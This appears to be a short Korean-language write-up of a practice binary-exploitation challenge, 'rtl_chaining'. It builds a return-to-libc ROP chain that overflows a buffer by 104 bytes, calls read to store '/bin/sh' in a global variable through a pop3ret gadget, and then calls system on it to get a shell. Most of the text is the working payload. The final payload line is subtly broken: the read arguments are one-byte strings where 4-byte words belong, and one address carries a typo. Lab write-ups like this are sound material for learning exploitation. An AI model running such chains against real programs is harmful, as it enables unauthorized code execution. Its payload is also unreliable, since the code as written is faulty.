rtl_chaining 풀이

info var 

info func 

이용 가능한 함수, 변수 목록 출력

0x0804a028  Name

0x08048340  read@plt
0x08048350  printf@plt
0x08048360  puts@plt
0x08048370  system@plt

함수 실행 순서 : print -> puts -> system -> read 

버퍼에서 100바이트 위치에 입력받음.

입력받는 부분 : read 

원하는 순서대로 프로그램을 실행해야 한다.
우선 name 변수에 "/bin/sh" 문자열을 넣어주기 위해서
1.name의 주소값을 인자로 read 함수를 호출한 다음
2.bin/sh을 표준입력으로 넣어주고
3.bin/sh가 들어간 name의 주소를을 인자로 system 함수를 호출해야 한다

총 호출 함수는 2개
예상 공격 스택을 그려보면


100byte
4byte / read.ebp
read@plt / read.ret
pop3ret
"0"
name주소
문자열 길이
system@plt
더미4바이트
name주소



버퍼로부터 100바이트 위치에 입력받아야 하므로
"a"x104+

read함수의 plt값을 넣어준다.
p32(0x08048340)+

다음 명령어 실행을 위해 스택을 비워줘야 하므로 rop 가젯을 사용한다
read함수 인자가 3개므로 pop3ret를 사용.
gdb-peda$ ropgadget
pop3ret = 0x8048549

p32(0x8048549)+


read 함수 호출을 위한 인자는 0, Name주소, 문자열 길이  순서로 총 3개가 들어간다.
"0"+p32(0x0804a028)+"8"+


system함수의 plt와 더미, name의 주소를 넣어주자.
p32(0x08048370)+"a"*4+p32(0x0804a028)

이다음 스택이 다 채워지고 나면, 프로그램 실행 중에 "/bin/sh"를 표준입력으로 받을 것이다. 

"/bin/sh\00"

종합하면
"a"x104+p32(0x08048340)+p32(0x08048549)+"0"+p32(0x0804a028)+"8"+p32(0x08048370)+"a"*4+p32(x0804a028)











